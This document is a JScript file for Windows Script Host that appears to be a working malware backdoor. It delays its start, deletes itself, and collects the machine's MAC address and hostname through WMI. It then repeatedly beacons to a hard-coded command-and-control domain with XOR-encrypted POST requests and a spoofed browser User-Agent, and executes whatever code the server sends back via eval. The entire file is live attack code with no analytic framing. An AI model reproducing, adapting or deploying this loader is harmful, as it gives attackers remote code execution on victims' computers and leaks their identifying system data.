function func_start_delay () {
	var s_WScript = WScript;
	s_WScript.Sleep(120000);
}
function func_crypt_controller (var_type, var_request) {
	try{
		var encryption_key = "";
		if(var_type === "decrypt") {
			var_request = unescape(var_request);
			var request_split = var_request.split("&_&");
			var_request = request_split[0];
			if (request_split.length == 2) {
				encryption_key = request_split[1].split("");
			}else{
				return var_request;
			}
		}else{
			encryption_key = (Math.floor(Math.random()*9000) + 1000).toString().split("");
			var_request=unescape(encodeURIComponent(var_request));
		}
		var var_output = new Array(var_request.length);
		for (var i_counter = 0; i_counter < var_request.length; i_counter++) {
			var var_charCode = var_request.charCodeAt(i_counter) ^ encryption_key[i_counter % encryption_key.length].charCodeAt(0);
			var_output[i_counter] = String.fromCharCode(var_charCode);
		}
		var result_string = var_output.join("");
		if(var_type === "encrypt") {
			result_string = result_string + "&_&" + encryption_key.join("");
			result_string = escape(result_string);
		}
		return result_string;
    }catch(e) {
        return "no";
    }
}
function func_id () {
	var mac_address = "#Error#";
	var dns_hostname = "#Error#";
	try{
		var lrequest = wmi.ExecQuery("select * from Win32_NetworkAdapterConfiguration where ipenabled = true");
		var lItems = new Enumerator(lrequest);
		for (; !lItems.atEnd(); lItems.moveNext()) {
			mac_address = lItems.item().macaddress;
			dns_hostname = lItems.item().DNSHostName;
			if(typeof mac_address === "string" && mac_address.length > 1) {
				if(typeof dns_hostname !== "string" && dns_hostname.length < 1) {
					dns_hostname = "Unknown";
				}else{
					for (var i_counter = 0; i_counter < dns_hostname.length; i_counter++) {
						if (dns_hostname.charAt(i_counter) > "z") {
							dns_hostname = dns_hostname.substr(0, i_counter) + "_" + dns_hostname.substr(i_counter + 1);
						}
					}
				}
				return mac_address + "_" + dns_hostname;
			}
		}
	}catch(e) {
        return mac_address + "_" + dns_hostname;
    }
}
function func_main () {
    var ncommand = "";
	var s_WScript = WScript;
    ncommand = send_data("request", "page_id=new", true);
    if(ncommand !== "no") {
		try {
			ncommand = func_crypt_controller("decrypt", ncommand);
			if(ncommand !== "no") {
				eval(func_crypt_controller("decrypt", ncommand));
			}
        }catch(e) {
        }
    }
    var random_knock = 120000 + (Math.floor(Math.random() * 16001) - 5000);
    s_WScript.Sleep(random_knock);
    func_main();
}
function func_get_path () {
    var var_pathes = ["images", "pictures", "img", "info", "new"];
    var var_files = ["sync", "show", "hide", "add", "new", "renew", "delete"];
    var var_path = var_pathes[Math.floor(Math.random() * var_pathes.length)] + "/" + var_files[Math.floor(Math.random() * var_files.length)];
    return "https://civilizationidium.com/" + var_path;
}
var wmi = GetObject("winmgmts:root/CIMV2");
var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var app_path = shell.expandEnvironmentStrings("%APPDATA%");
var uniq_id = new Date().getUTCMilliseconds();
if(fso.GetAbsolutePathName(fso.GetParentFolderName(app_path)).indexOf("AppData") > 5) {
    if(WScript.ScriptFullName.indexOf("Microsoft"+String.fromCharCode(0x5C)+"Windows")<0){
		 try{
			 fso.deleteFile(WScript.ScriptFullName);
		 }catch(e) {}
    }
    try{
        func_start_delay ();
        func_main();
    }catch(e) {
        func_main();
    }
}
function send_data (var_type, var_data, var_crypt) {
    try {
        var http_object = new ActiveXObject("MSXML2.ServerXMLHTTP");
        if(var_type === "request") {
            http_object.open("POST", func_get_path () + "?type=name", false);
            var_data = "zawgkveuwynyjvizs=" + func_crypt_controller("encrypt", "group=sp&rt=0&secret=HiyFIYF973IYFCviyv&time=120000&uid=" + uniq_id + "&id=" + func_id() + "&" + var_data);
        }else{
            http_object.open("POST", func_get_path () + "?type=content&id=" + uniq_id, false);
            if(var_crypt) {
                var_data = func_crypt_controller("encrypt", var_data);
            }
        }
        http_object.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/50.0");
        http_object.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        http_object.setOption(2, 13056);
        http_object.send(var_data);
        return http_object.responseText;
    }catch(e) {
        return "no";
    }
}
function func_decrypt(strInpit) {
	strPass = {redacted}
	var strRet=new String("");
	var arrtext = strInpit.split(",");
	var i_counter=0;var j_counter=0;
	for(i_counter=0;i_counter<arrtext.length-1;i_counter++) {
		var char_c=String.fromCharCode(Number(arrtext[i_counter]));
		var charCom=char_c.charCodeAt(0)^strPass.charCodeAt(j_counter);
		char_c=String.fromCharCode(charCom);
		strRet+= char_c;
		if(j_counter==strPass.length-1)j_counter=0; else j_counter++;
	}
	return strRet;
}
